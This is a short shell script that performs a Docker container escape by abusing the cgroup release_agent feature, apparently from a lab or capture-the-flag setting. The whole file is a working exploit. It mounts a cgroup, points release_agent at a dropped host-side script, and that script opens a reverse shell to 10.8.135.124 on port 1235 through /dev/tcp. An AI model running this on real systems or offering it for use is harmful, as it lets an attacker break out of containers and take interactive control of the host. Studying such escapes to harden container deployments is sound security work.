#!/bin/sh

# Docker Escape Exploit Script
# This script demonstrates a Docker container escape by exploiting the cgroup release_agent functionality.

# Clean up previous attempts
rm -rf /tmp/cgrp

# Create a cgroup and mount it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enable notify_on_release for the cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Extract the host's path from /etc/mtab
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Set the release_agent to execute a script on the host
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# Create the exploit script on the host
echo '#!/bin/sh' > /exploit
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.135.124/1235 0>&1'" >> /exploit
chmod a+x /exploit

# Trigger the exploit by adding a process to the cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
